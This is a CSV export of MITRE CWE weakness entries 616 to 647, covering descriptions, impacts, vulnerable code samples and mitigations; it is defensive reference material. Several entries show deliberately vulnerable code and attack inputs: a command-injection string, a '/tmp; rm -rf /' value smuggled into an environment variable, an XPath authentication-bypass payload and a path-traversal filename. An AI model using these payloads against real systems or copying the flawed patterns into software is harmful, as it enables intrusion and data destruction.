CWE-616: Incomplete Identification of Uploaded File Variables (PHP),"The PHP application uses an old method for processing uploaded files by referencing the four global variables that are set for each file (e.g. $varname, $varname_size, $varname_name, $varname_type). These variables could be overwritten by attackers, causing the application to process unauthorized files.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ","Example 1As of 2006, the ""four globals"" method is probably in sharp decline, but older PHP applications could have this issue.In the ""four globals"" method, PHP sets the following 4 global variables (where ""varname"" is application-dependent):(bad code)Example Language:PHP$varname = name of the temporary file on local machine$varname_size = size of file$varname_name = original name of file provided by client$varname_type = MIME type of the fileExample 2""The global $_FILES exists as of PHP 4.1.0 (Use $HTTP_POST_FILES instead if using an earlier version). These arrays will contain all the uploaded file information.""(bad code)Example Language:PHP$_FILES['userfile']['name'] - original filename from client$_FILES['userfile']['tmp_name'] - the temp filename of the file on the server** note: 'userfile' is the field name from the web form; this can vary.","Phase:  Architecture and DesignUse PHP 4 or later.Phase:  Architecture and DesignIf you must support older PHP versions, write your own version of is_uploaded_file() and run it against $HTTP_POST_FILES['userfile']))Phase:  ImplementationFor later PHP versions, reference uploaded files using the $HTTP_POST_FILES or $_FILES variables, and use is_uploaded_file() or move_uploaded_file() to ensure that you are dealing with an uploaded file."
CWE-617: Reachable Assertion,"The product contains an assert() or similar statement that can be triggered by an attacker, which leads to an application exit or other behavior that is more severe than necessary.","Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartAn attacker that can trigger an assert statement can still lead to a denial of service if the relevant code can be triggered by an attacker, and if the scope of the assert() extends beyond the attacker's own session., Likelihood: ","Example 1In the excerpt below, an AssertionError (an unchecked exception) is thrown if the user hasn't entered an email address in an HTML form.(bad code)Example Language:JavaString email = request.getParameter(""email_address"");assert email != null;",Phase:  ImplementationMake sensitive open/close operation non reachable by directly user-controlled data (e.g. open/close resources)Phase:  ImplementationStrategy:  Input ValidationPerform input validation on user data.
CWE-618: Exposed Unsafe ActiveX Method,"An ActiveX control is intended for use in a web browser, but it exposes dangerous methods that perform actions that are outside of the browser's security model (e.g. the zone or domain).","Scope: Other, Impact: Technical Impact:Other, Likelihood: ",无示范例子,"Phase:  ImplementationIf you must expose a method, make sure to perform input validation on all arguments, and protect against all possible vulnerabilities.Phase:  Architecture and DesignUse code signing, although this does not protect against any weaknesses that are already in the control.Phases:  Architecture and Design; System ConfigurationWhere possible, avoid marking the control as safe for scripting."
CWE-619: Dangling Database Cursor ('Cursor Injection'),"If a database cursor is not closed properly, then it could become accessible to other users while retaining the same privileges that were originally assigned, leaving the cursor ""dangling.""","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Application Data; Modify Application Data, Likelihood: ",无示范例子,Phase:  ImplementationClose cursors immediately after access to them is complete. Ensure that you close cursors if exceptions occur.
CWE-620: Unverified Password Change,"When setting a new password for a user, the product does not require knowledge of the original password, or using another form of authentication.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume Identity, Likelihood: ","Example 1This code changes a user's password.(bad code)Example Language:PHP$user = $_GET['user'];$pass = $_GET['pass'];$checkpass = $_GET['checkpass'];if ($pass == $checkpass) {SetUserPassword($user, $pass);}While the code confirms that the requesting user typed the same new password twice, it does not confirm that the user requesting the password change is the same user whose password will be changed. An attacker can request a change of another user's password and gain control of the victim's account.","Phase:  Architecture and DesignWhen prompting for a password change, force the user to provide the original password in addition to the new password.Phase:  Architecture and DesignDo not use ""forgotten password"" functionality. But if you must, ensure that you are only providing information to the actual user, e.g. by using an email address or challenge question that the legitimate user already provided in the past; do not allow the current user to change this identity information until the correct password has been provided."
CWE-621: Variable Extraction Error,"The product uses external input to determine the names of variables into which information is extracted, without verifying that the names of the specified variables are valid. This could cause the program to overwrite unintended variables.","Scope: Integrity, Impact: Technical Impact:Modify Application DataAn attacker could modify sensitive data or program variables., Likelihood: ","Example 1This code uses the credentials sent in a POST request to login a user.(bad code)Example Language:PHP//Log user in, and set $isAdmin to true if user is an administratorfunction login($user,$pass){$query = buildQuery($user,$pass);mysql_query($query);if(getUserRole($user) == ""Admin""){$isAdmin = true;}}$isAdmin = false;extract($_POST);login(mysql_real_escape_string($user),mysql_real_escape_string($pass));The call to extract() will overwrite the existing values of any variables defined previously, in this case $isAdmin. An attacker can send a POST request with an unexpected third value ""isAdmin"" equal to ""true"", thus gaining Admin privileges.","Phase:  ImplementationStrategy:  Input ValidationUse allowlists of variable names that can be extracted.Phase:  ImplementationConsider refactoring your code to avoid extraction routines altogether.Phase:  ImplementationIn PHP, call extract() with options such as EXTR_SKIP and EXTR_PREFIX_ALL; call import_request_variables() with a prefix argument. Note that these capabilities are not present in all PHP versions."
CWE-622: Improper Validation of Function Hook Arguments,"The product adds hooks to user-accessible API functions, but it does not properly validate the arguments. This could lead to resultant vulnerabilities.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Phase:  Architecture and DesignEnsure that all arguments are verified, as defined by the API you are protecting.Phase:  Architecture and DesignDrop privileges before invoking such functions, if possible."
CWE-623: Unsafe ActiveX Control Marked Safe For Scripting,"An ActiveX control is intended for restricted use, but it has been marked as safe-for-scripting.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands, Likelihood: ",无示范例子,"Phase:  Architecture and DesignDuring development, do not mark it as safe for scripting.Phase:  System ConfigurationAfter distribution, you can set the kill bit for the control so that it is not accessible from Internet Explorer."
CWE-624: Executable Regular Expression Error,"The product uses a regular expression that either (1) contains an executable component with user-controlled inputs, or (2) allows a user to enable execution by inserting pattern modifiers.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands, Likelihood: ",无示范例子,"Phase:  ImplementationThe regular expression feature in some languages allows inputs to be quoted or escaped before insertion, such as \Q and \E in Perl."
CWE-625: Permissive Regular Expression,The product uses a regular expression that does not sufficiently restrict the set of allowed values.,"Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ","Example 1The following code takes phone numbers as input, and uses a regular expression to reject invalid phone numbers.(bad code)Example Language:Perl$phone = GetPhoneNumber();if ($phone =~ /\d+-\d+/) {# looks like it only has hyphens and digitssystem(""lookup-phone $phone"");}else {error(""malformed number!"");}An attacker could provide an argument such as: ""; ls -l ; echo 123-456"" This would pass the check, since ""123-456"" is sufficient to match the ""\d+-\d+"" portion of the regular expression.Example 2This code uses a regular expression to validate an IP string prior to using it in a call to the ""ping"" command.(bad code)Example Language:Pythonimport subprocessimport redef validate_ip_regex(ip: str):ip_validator = re.compile(r""((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}"")if ip_validator.match(ip):return ipelse:raise ValueError(""IP address does not match valid pattern."")def run_ping_regex(ip: str):validated = validate_ip_regex(ip)# The ping command treats zero-prepended IP addresses as octalresult = subprocess.call([""ping"", validated])print(result)Since the regular expression does not have anchors (CWE-777), i.e. is unbounded without ^ or $ characters, then prepending a 0 or 0x to the beginning of the IP address will still result in a matched regex pattern. Since the ping command supports octal and hex prepended IP addresses, it will use the unexpectedly valid IP address (CWE-1389). For example, ""0x63.63.63.63"" would be considered equivalent to ""99.63.63.63"". As a result, the attacker could potentially ping systems that the attacker cannot reach directly.","Phase:  ImplementationWhen applicable, ensure that the regular expression marks beginning and ending string patterns, such as ""/^string$/"" for Perl."
CWE-626: Null Byte Interaction Error (Poison Null Byte),The product does not properly handle null bytes or NUL characters when passing data between different representations or components.,"Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,Phase:  ImplementationRemove null bytes from all incoming strings.
CWE-627: Dynamic Variable Evaluation,"In a language where the user can influence the name of a variable at runtime, if the variable names are not controlled, an attacker can read or write to arbitrary variables, or access arbitrary functions.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Modify Application Data; Execute Unauthorized Code or CommandsAn attacker could gain unauthorized access to internal program variables and execute arbitrary code., Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  RefactoringRefactor the code to avoid dynamic variable evaluation whenever possible.Phase:  ImplementationStrategy:  Input ValidationUse only allowlists of acceptable variable or function names.Phase:  ImplementationFor function names, ensure that you are only calling functions that accept the proper number of arguments, to avoid unexpected null arguments."
CWE-628: Function Call with Incorrectly Specified Arguments,"The product calls a function, procedure, or routine with arguments that are not correctly specified, leading to always-incorrect behavior and resultant weaknesses.","Scope: OtherAccess Control, Impact: Technical Impact:Quality Degradation; Gain Privileges or Assume IdentityThis weakness can cause unintended behavior and can lead to additional weaknesses such as allowing an attacker to gain unintended access to system resources., Likelihood: ","Example 1The following PHP method authenticates a user given a username/password combination but is called with the parameters in reverse order.(bad code)Example Language:PHPfunction authenticate($username, $password) {// authenticate user...}authenticate($_POST['password'], $_POST['username']);Example 2This Perl code intends to record whether a user authenticated successfully or not, and to exit if the user fails to authenticate. However, when it calls ReportAuth(), the third argument is specified as 0 instead of 1, so it does not exit.(bad code)Example Language:Perlsub ReportAuth {my ($username, $result, $fatal) = @_;PrintLog(""auth: username=%s, result=%d"", $username, $result);if (($result ne ""success"") && $fatal) {die ""Failed!\n"";}}sub PrivilegedFunc{my $result = CheckAuth($username);ReportAuth($username, $result, 0);DoReallyImportantStuff();}Example 3In the following Java snippet, the accessGranted() method is accidentally called with the static ADMIN_ROLES array rather than the user roles.(bad code)Example Language:Javaprivate static final String[] ADMIN_ROLES = ...;public boolean void accessGranted(String resource, String user) {String[] userRoles = getUserRoles(user);return accessGranted(resource, ADMIN_ROLES);}private boolean void accessGranted(String resource, String[] userRoles) {// grant or deny access based on user roles...}","Phase:  Build and CompilationOnce found, these issues are easy to fix. Use code inspection tools and relevant compiler features to identify potential violations. Pay special attention to code that is not likely to be exercised heavily during QA.Phase:  Architecture and DesignMake sure your API's are stable before you use them in production code."
CWE VIEW: Weaknesses in OWASP Top Ten (2007),"CWE nodes in this view (graph) are associated with the OWASP Top Ten, as released in 2007. This view is considered obsolete as a newer version of the OWASP Top Ten is available.",无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: DEPRECATED: Weaknesses Examined by SAMATE,"This view has been deprecated. It was only used for an early year of the NIST SAMATE project, and it did not represent any official or commonly-utilized list.",无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: DEPRECATED: Resource-specific Weaknesses,This view has been deprecated because it is not actively maintained and does not provide utility to stakeholders. It was originally created before CWE 1.0 as a simple example of how views could be structured within CWE.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: DEPRECATED: Weaknesses that Affect Files or Directories,"This category has been deprecated. It was not actively maintained, and it was not useful to stakeholders. It was originally created before CWE 1.0 as part of viewCWE-631, which was a simple example of how views could be structured within CWE.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: DEPRECATED: Weaknesses that Affect Memory,"This category has been deprecated. It was not actively maintained, and it was not useful to stakeholders. It was originally created before CWE 1.0 as part of viewCWE-631, which was a simple example of how views could be structured within CWE.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: DEPRECATED: Weaknesses that Affect System Processes,"This category has been deprecated. It was not actively maintained, and it was not useful to stakeholders. It was originally created before CWE 1.0 as part of viewCWE-631, which was a simple example of how views could be structured within CWE.",无常见后果信息,无示范例子,无可能的缓解方案
CWE VIEW: Weaknesses Originally Used by NVD from 2008 to 2016,"CWE nodes in this view (slice) were used by NIST to categorize vulnerabilities within NVD, from 2008 to 2016. This original version has been used by many other projects.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-636: Not Failing Securely ('Failing Open'),"When the product encounters an error condition or failure, its design requires it to fall back to a state that is less secure than other options that are available, such as selecting the weakest encryption algorithm or using the most permissive access control restrictions.","Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismIntended access restrictions can be bypassed, which is often contradictory to what the product's administrator expects., Likelihood: ","Example 1Switches may revert their functionality to that of hubs when the table used to map ARP information to the switch interface overflows, such as when under a spoofing attack. This results in traffic being broadcast to an eavesdropper, instead of being sent only on the relevant switch interface. To mitigate this type of problem, the developer could limit the number of ARP entries that can be recorded for a given switch interface, while other interfaces may keep functioning normally. Configuration options can be provided on the appropriate actions to be taken in case of a detected failure, but safe defaults should be used.",Phase:  Architecture and DesignSubdivide and allocate resources and components so that a failure in one part does not affect the entire product.
CWE-637: Unnecessary Complexity in Protection Mechanism (Not Using 'Economy of Mechanism'),"The product uses a more complex mechanism than necessary, which could lead to resultant weaknesses when the mechanism is not correctly understood, modeled, configured, implemented, or used.","Scope: Other, Impact: Technical Impact:Other, Likelihood: ","Example 1The IPSEC specification is complex, which resulted in bugs, partial implementations, and incompatibilities between vendors.Example 2HTTP Request Smuggling (CWE-444) attacks are feasible because there are not stringent requirements for how illegal or inconsistent HTTP headers should be handled. This can lead to inconsistent implementations in which a proxy or firewall interprets the same data stream as a different set of requests than the end points in that stream.","Phase:  Architecture and DesignAvoid complex security mechanisms when simpler ones would meet requirements. Avoid complex data models, and unnecessarily complex operations. Adopt architectures that provide guarantees, simplify understanding through elegance and abstraction, and that can be implemented similarly. Modularize, isolate and do not trust complex code, and apply other secure programming principles on these modules (e.g., least privilege) to mitigate vulnerabilities."
CWE-638: Not Using Complete Mediation,"The product does not perform access checks on a resource every time the resource is accessed by an entity, which can create resultant weaknesses if that entity's rights or privileges change over time.","Scope: IntegrityConfidentialityAvailabilityAccess ControlOther, Impact: Technical Impact:Gain Privileges or Assume Identity; Execute Unauthorized Code or Commands; Bypass Protection Mechanism; Read Application Data; OtherA user might retain access to a critical resource even after privileges have been revoked, possibly allowing access to privileged functionality or sensitive information, depending on the role of the resource., Likelihood: ","Example 1When executable library files are used on web servers, which is common in PHP applications, the developer might perform an access check in any user-facing executable, and omit the access check from the library file itself. By directly requesting the library file (CWE-425), an attacker can bypass this access check.Example 2When a developer begins to implement input validation for a web application, often the validation is performed in each area of the code that uses externally-controlled input. In complex applications with many inputs, the developer often misses a parameter here or a cookie there. One frequently-applied solution is to centralize all input validation, store these validated inputs in a separate data structure, and require that all access of those inputs must be through that data structure. An alternate approach would be to use an external input validation framework such as Struts, which performs the validation before the inputs are ever processed by the code.","Phase:  Architecture and DesignInvalidate cached privileges, file handles or descriptors, or other access credentials whenever identities, processes, policies, roles, capabilities or permissions change. Perform complete authentication checks before accepting, caching and reusing data, dynamic content and code (scripts). Avoid caching access control decisions as much as possible.Phase:  Architecture and DesignIdentify all possible code paths that might access sensitive resources. If possible, create and use a single interface that performs the access checks, and develop code standards that require use of this interface."
CWE-639: Authorization Bypass Through User-Controlled Key,The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data.,"Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismAccess control checks for specific user data or functionality can be bypassed., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityHorizontal escalation of privilege is possible (one user can view/modify information of another user)., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityVertical escalation of privilege is possible if the user-controlled key is actually a flag that indicates administrator status, allowing the attacker to gain administrative access., Likelihood: ","Example 1The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user.(bad code)Example Language:C#...conn = new SqlConnection(_ConnectionString);conn.Open();int16 id = System.Convert.ToInt16(invoiceID.Text);SqlCommand query = new SqlCommand( ""SELECT * FROM invoices WHERE id = @id"", conn);query.Parameters.AddWithValue(""@id"", id);SqlDataReader objReader = objCommand.ExecuteReader();...The problem is that the developer has not considered all of the possible values of id. Although the interface generates a list of invoice identifiers that belong to the current user, an attacker can bypass this interface to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user.","Phase:  Architecture and DesignFor each and every data access, ensure that the user has sufficient privilege to access the record that is being requested.Phases:  Architecture and Design; ImplementationMake sure that the key that is used in the lookup of a specific user's record is not controllable externally by the user or that any tampering can be detected.Phase:  Architecture and DesignUse encryption in order to make it more difficult to guess other legitimate values of the key or associate a digital signature with the key so that the server can verify that there has been no tampering."
CWE-640: Weak Password Recovery Mechanism for Forgotten Password,"The product contains a mechanism for users to recover or change their passwords without knowing the original password, but the mechanism is weak.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityAn attacker could gain unauthorized access to the system by retrieving legitimate user's authentication credentials., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (Other)An attacker could deny service to legitimate system users by launching a brute force attack on the password recovery mechanism using user ids of legitimate users., Likelihood: ; Scope: IntegrityOther, Impact: Technical Impact:OtherThe system's security functionality is turned against the system by the attacker., Likelihood: ","Example 1A famous example of this type of weakness being exploited is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction.",Phase:  Architecture and DesignMake sure that all input supplied by the user to the password recovery mechanism is thoroughly filtered and validated.Phase:  Architecture and DesignDo not use standard weak security questions and use several security questions.Phase:  Architecture and DesignMake sure that there is throttling on the number of incorrect answers to a security question. Disable the password recovery functionality after a certain (small) number of incorrect guesses.Phase:  Architecture and DesignRequire that the user properly answers the security question prior to resetting their password and sending the new password to the e-mail address of record.Phase:  Architecture and DesignNever allow the user to control what e-mail address the new password will be sent to in the password recovery mechanism.Phase:  Architecture and DesignAssign a new temporary password rather than revealing the original password.
CWE-641: Improper Restriction of Names for Files and Other Resources,"The product constructs the name of a file or other resource using input from an upstream component, but it does not restrict or incorrectly restricts the resulting name.","Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsExecution of arbitrary code in the context of usage of the resources with dangerous names., Likelihood: ; Scope: ConfidentialityAvailability, Impact: Technical Impact:Read Application Data; DoS: Crash, Exit, or RestartCrash of the consumer code of these resources resulting in information leakage or denial of service., Likelihood: ",无示范例子,"Phase:  Architecture and DesignDo not allow users to control names of resources used on the server side.Phase:  Architecture and DesignPerform allowlist input validation at entry points and also before consuming the resources. Reject bad file names rather than trying to cleanse them.Phase:  Architecture and DesignMake sure that technologies consuming the resources are not vulnerable (e.g. buffer overflow, format string, etc.) in a way that would allow code execution if the name of the resource is malformed."
CWE-642: External Control of Critical State Data,"The product stores security-critical state information about its users, or the product itself, in a location that is accessible to unauthorized actors.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume IdentityAn attacker could potentially modify the state in malicious ways. If the state is related to the privileges or level of authentication that the user has, then state modification might allow the user to bypass authentication or elevate privileges., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Application DataThe state variables may contain sensitive information that should not be known by the client., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartBy modifying state variables, the attacker could violate the application's expectations for the contents of the state, leading to a denial of service due to an unexpected error condition., Likelihood: ","Example 1In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data.(bad code)Example Language:JavaCookie[] cookies = request.getCookies();for (int i =0; i< cookies.length; i++) {Cookie c = cookies[i];if (c.getName().equals(""authenticated"") && Boolean.TRUE.equals(c.getValue())) {authenticated = true;}}Example 2The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as ""../../tomcat/conf/server.xml"", which causes the application to delete one of its own configuration files (CWE-22).(bad code)Example Language:JavaString rName = request.getParameter(""reportName"");File rFile = new File(""/usr/local/apfr/reports/"" + rName);...rFile.delete();Example 3The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.(bad code)Example Language:Javafis = new FileInputStream(cfg.getProperty(""sub"")+"".txt"");amt = fis.read(arr);out.println(arr);Example 4This program is intended to execute a command that lists the contents of a restricted directory, then performs other actions. Assume that it runs with setuid privileges in order to bypass the permissions check by the operating system.(bad code)Example Language:C#define DIR ""/restricted/directory""char cmd[500];sprintf(cmd, ""ls -l %480s"", DIR);/* Raise privileges to those needed for accessing DIR. */RaisePrivileges(...);system(cmd);DropPrivileges(...);...This code may look harmless at first, since both the directory and the command are set to fixed values that the attacker can't control. The attacker can only see the contents for DIR, which is the intended program behavior. Finally, the programmer is also careful to limit the code that executes with raised privileges.However, because the program does not modify the PATH environment variable, the following attack would work:(attack code)The user sets the PATH to reference a directory under the attacker's control, such as ""/my/dir/"".The attacker creates a malicious program called ""ls"", and puts that program in /my/dirThe user executes the program.When system() is executed, the shell consults the PATH to find the ls programThe program finds the attacker's malicious program, ""/my/dir/ls"". It doesn't find ""/bin/ls"" because PATH does not contain ""/bin/"".The program executes the attacker's malicious program with the raised privileges.Example 5The following code segment implements a basic server that uses the ""ls"" program to perform a directory listing of the directory that is listed in the ""HOMEDIR"" environment variable. The code intends to allow the user to specify an alternate ""LANG"" environment variable. This causes ""ls"" to customize its output based on a given language, which is an important capability when supporting internationalization.(bad code)Example Language:Perl$ENV{""HOMEDIR""} = ""/home/mydir/public/"";my $stream = AcceptUntrustedInputStream();while (<$stream>) {chomp;if (/^ENV ([\w\_]+) (.*)/) {$ENV{$1} = $2;}elsif (/^QUIT/) { ... }elsif (/^LIST/) {open($fh, ""/bin/ls -l $ENV{HOMEDIR}|"");while (<$fh>) {SendOutput($stream, ""FILEINFO: $_"");}close($fh);}}The programmer takes care to call a specific ""ls"" program and sets the HOMEDIR to a fixed value. However, an attacker can use a command such as ""ENV HOMEDIR /secret/directory"" to specify an alternate directory, enabling a path traversal attack (CWE-22). At the same time, other attacks are enabled as well, such as OS command injection (CWE-78) by setting HOMEDIR to a value such as ""/tmp; rm -rf /"". In this case, the programmer never intends for HOMEDIR to be modified, so input validation for HOMEDIR is not the solution. A partial solution would be an allowlist that only allows the LANG variable to be specified in the ENV command. Alternately, assuming this is an authenticated user, the language could be stored in a local file so that no ENV command at all would be needed.While this example may not appear realistic, this type of problem shows up in code fairly frequently. See CVE-1999-0073 in the observed examples for a real-world example with similar behaviors.","Phase:  Architecture and DesignUnderstand all the potential locations that are accessible to attackers. For example, some programmers assume that cookies and hidden form fields cannot be modified by an attacker, or they may not consider that environment variables can be modified before a privileged program is invoked.Phase:  Architecture and DesignStrategy:  Attack Surface ReductionStore state information and sensitive data on the server side only.Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions.If information must be stored on the client, do not do so without encryption and integrity checking, or otherwise having a mechanism on the server side to catch tampering. Use a message authentication code (MAC) algorithm, such as Hash Message Authentication Code (HMAC) [REF-529]. Apply this against the state or sensitive data that has to be exposed, which can guarantee the integrity of the data - i.e., that the data has not been modified. Ensure that a strong hash function is used (CWE-328).Phase:  Architecture and DesignStore state information on the server side only. Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions.Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.With a stateless protocol such as HTTP, use some frameworks can maintain the state for you.Examples include ASP.NET View State and the OWASP ESAPI Session Management feature.Be careful of language features that provide state support, since these might be provided as a convenience to the programmer and may not be considering security.Phase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoidCWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Phases:  Operation; ImplementationStrategy:  Environment HardeningWhen using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such asCWE-95,CWE-621, and similar issues.Phase:  TestingUse automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.Phase:  TestingUse dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.Phase:  TestingUse tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."
CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection'),"The product uses external input to dynamically construct an XPath expression used to retrieve data from an XML database, but it does not neutralize or incorrectly neutralizes that input. This allows an attacker to control the structure of the query.","Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismControlling application flow (e.g. bypassing authentication)., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Application DataThe attacker could read restricted XML content., Likelihood: ","Example 1Consider the following simple XML document that stores authentication information and a snippet of Java code that uses XPath query to retrieve authentication information:(informative)Example Language:XML<users><user><login>john</login><password>abracadabra</password><home_dir>/home/john</home_dir></user><user><login>cbc</login><password>1mgr8</password><home_dir>/home/cbc</home_dir></user></users>The Java code used to retrieve the home directory based on the provided credentials is:(bad code)Example Language:JavaXPath xpath = XPathFactory.newInstance().newXPath();XPathExpression xlogin = xpath.compile(""//users/user[login/text()='"" + login.getUserName() + ""' and password/text() = '"" + login.getPassword() + ""']/home_dir/text()"");Document d = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(new File(""db.xml""));String homedir = xlogin.evaluate(d);Assume that user ""john"" wishes to leverage XPath Injection and login without a valid password. By providing a username ""john"" and password ""' or ''='"" the XPath expression now becomes(attack code)//users/user[login/text()='john' or ''='' and password/text() = '' or ''='']/home_dir/text()This lets user ""john"" login without a valid password, thus bypassing authentication.","Phase:  ImplementationUse parameterized XPath queries (e.g. using XQuery). This will help ensure separation between data plane and control plane.Phase:  ImplementationProperly validate user input. Reject data where appropriate, filter where appropriate and escape where appropriate. Make sure input that will be used in XPath queries is safe in that context."
CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax,"The product does not neutralize or incorrectly neutralizes web scripting syntax in HTTP headers that can be used by web browser components that can process raw headers, such as Flash.","Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsRun arbitrary code., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Application DataAttackers may be able to obtain sensitive information., Likelihood: ","Example 1In the following Java example, user-controlled data is added to the HTTP headers and returned to the client. Given that the data is not subject to neutralization, a malicious user may be able to inject dangerous scripting tags that will lead to script execution in the client browser.(bad code)Example Language:Javaresponse.addHeader(HEADER_NAME, untrustedRawInputData);",Phase:  Architecture and DesignPerform output validation in order to filter/escape/encode unsafe data that is being passed from the server in an HTTP response header.Phase:  Architecture and DesignDisable script execution functionality in the clients' browser.
CWE-645: Overly Restrictive Account Lockout Mechanism,"The product contains an account lockout protection mechanism, but the mechanism is too restrictive and can be triggered too easily, which allows attackers to deny service to legitimate users by causing their accounts to be locked out.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (Other)Users could be locked out of accounts., Likelihood: ","Example 1A famous example of this type of weakness being exploited is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction.","Phase:  Architecture and DesignImplement more intelligent password throttling mechanisms such as those which take IP address into account, in addition to the login name.Phase:  Architecture and DesignImplement a lockout timeout that grows as the number of incorrect login attempts goes up, eventually resulting in a complete lockout.Phase:  Architecture and DesignConsider alternatives to account lockout that would still be effective against password brute force attacks, such as presenting the user machine with a puzzle to solve (makes it do some computation)."
CWE-646: Reliance on File Name or Extension of Externally-Supplied File,"The product allows a file to be uploaded, but it relies on the file name or extension of the file to determine the appropriate behaviors. This could be used by attackers to cause the file to be misclassified and processed in a dangerous fashion.","Scope: Confidentiality, Impact: Technical Impact:Read Application DataAn attacker may be able to read sensitive data., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartAn attacker may be able to cause a denial of service., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityAn attacker may be able to gain privileges., Likelihood: ",无示范例子,Phase:  Architecture and DesignMake decisions on the server side based on file content and not on file name or extension.
CWE-647: Use of Non-Canonical URL Paths for Authorization Decisions,The product defines policy namespaces and makes authorization decisions based on the assumption that a URL is canonical. This can allow a non-canonical URL to bypass the authorization.,"Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismAn attacker may be able to bypass the authorization mechanism to gain access to the otherwise-protected URL., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Files or DirectoriesIf a non-canonical URL is used, the server may choose to return the contents of the file, instead of pre-processing the file (e.g. as a program)., Likelihood: ","Example 1Example from CAPEC (CAPEC ID: 4, ""Using Alternative IP Address Encodings""). An attacker identifies an application server that applies a security policy based on the domain and application name, so the access control policy covers authentication and authorization for anyone accessing http://example.domain:8080/application. However, by putting in the IP address of the host the application authentication and authorization controls may be bypassed http://192.168.0.1:8080/application. The attacker relies on the victim applying policy to the namespace abstraction and not having a default deny policy in place to manage exceptions.",Phase:  Architecture and DesignMake access control policy based on path information in canonical form. Use very restrictive regular expressions to validate that the path is in the expected form.Phase:  Architecture and DesignReject all alternate path encodings that are not in the expected canonical form.
